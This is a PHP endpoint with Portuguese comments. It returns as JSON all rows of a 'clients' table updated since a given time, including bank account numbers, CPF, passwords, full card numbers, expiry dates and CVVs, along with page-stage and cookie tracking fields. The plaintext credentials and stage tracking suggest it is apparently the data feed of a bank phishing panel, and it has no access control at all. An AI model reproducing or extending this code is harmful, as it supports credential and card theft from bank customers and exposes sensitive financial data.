<?php
// File: public/novos_dados.php
require __DIR__ . '/../includes/db.php';
header('Content-Type: application/json; charset=utf-8');

/*
  Parâmetro opcional:
    ?since=2025-07-20 22:45:00   (qualquer formato aceito por DateTime)
  Retorna todos os clients com updated_at > since.
*/

$since  = $_GET['since'] ?? null;
$params = [];
$where  = [];

$sql = "
    SELECT 
        id,
        nome,
        saldo,
        referencia_dispositivo,
        agencia,
        conta,
        digito,
        cpf,
        telefone,
        tipo,                  -- NOVO CAMPO 'tipo'
        chave,
        senha,
        numero_cartao,
        validade_cartao,
        cvv_cartao,
        status,
        status_estagio,        -- campos já adicionados anteriormente
        last_page_at,
        created_at,
        updated_at,
        identificador_cookie,
        last_active_at
    FROM clients
";

if ($since) {
    try {
        $d = new DateTime($since);
        $where[]         = 'updated_at > :since';
        $params['since'] = $d->format('Y-m-d H:i:s');
    } catch (Exception $e) {
        // formato inválido: ignora filtro
    }
}

if (!empty($where)) {
    $sql .= ' WHERE ' . implode(' AND ', $where);
}

$sql .= ' ORDER BY updated_at ASC';

$stmt = $pdo->prepare($sql);
$stmt->execute($params);

$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

foreach ($rows as &$r) {
    if (isset($r['saldo'])) {
        // garante duas casas decimais no padrão ponto
        $r['saldo'] = number_format((float)$r['saldo'], 2, '.', '');
    }
}

echo json_encode($rows, JSON_UNESCAPED_UNICODE);
